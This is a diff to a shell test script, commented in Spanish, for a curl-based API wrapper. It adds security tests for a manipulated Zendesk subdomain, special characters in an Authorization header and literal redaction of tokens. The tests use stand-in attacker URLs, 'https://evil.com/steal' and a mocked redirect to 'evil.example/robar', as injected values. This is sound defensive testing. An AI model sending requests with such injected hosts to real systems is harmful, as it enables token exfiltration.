@@ -61,4 +61,16 @@ printf '\n302' > "$T/curl.resp.1"; printf 'location: https://evil.example/robar\
 run "$REPO/bin/em-api" storyblok-cdn GET /stories/x >/dev/null 2>&1; rc=$?
 { [ $rc != 0 ] && [ "$(cat "$T/curl.n")" = 1 ]; } && ok "8b no sigue a host ajeno" || ko "8b no sigue a host ajeno"
 rm -f "$T/curl.n" "$T"/curl.resp.*
+# 9. variables que entran en hosts: solo [a-z0-9-]
+rm -f "$T/curl.args" "$T/curl.n"
+(export EMT="$T" PATH="$T/bin:$PATH" TMPDIR="$T/tmp" ZENDESK_SUBDOMAIN='evil.com x'; "$REPO/bin/em-api" zendesk GET https://evil.com/steal >/dev/null 2>&1); rc=$?
+{ [ $rc = 2 ] && [ ! -f "$T/curl.args" ]; } && ok "9 subdominio manipulado" || ko "9 subdominio manipulado"
+# 10. token con caracteres especiales en cabecera
+rm -f "$T/curl.n"; err=$( (export EMT="$T" PATH="$T/bin:$PATH" TMPDIR="$T/tmp" STORYBLOK_SPACE_ID=123 STORYBLOK_MANAGEMENT_TOKEN='oc-sent-a#b&c\d'; "$REPO/bin/em-api" storyblok GET /stories 2>&1 >/dev/null) )
+{ grep -qxF 'Authorization: oc-sent-a#b&c\d' "$T/curl.args" && [ -z "$err" ]; } && ok "10 cabecera con caracteres especiales" || ko "10 cabecera con caracteres especiales"
+# 11. redacción literal (sin glob)
+rm -f "$T/curl.n"; printf 'eco oc-sent-[ab] fin\n500' > "$T/curl.resp"
+all=$( (export EMT="$T" PATH="$T/bin:$PATH" TMPDIR="$T/tmp" STORYBLOK_SPACE_ID=123 STORYBLOK_MANAGEMENT_TOKEN='oc-sent-[ab]'; "$REPO/bin/em-api" storyblok GET /stories 2>&1) )
+! grep -qF 'oc-sent-[ab]' <<<"$all" && ok "11 redacción literal" || ko "11 redacción literal"
+rm -f "$T/curl.resp"
 echo "== $pass OK, $fail fallos"; rm -rf "$T"; [ $fail -eq 0 ]
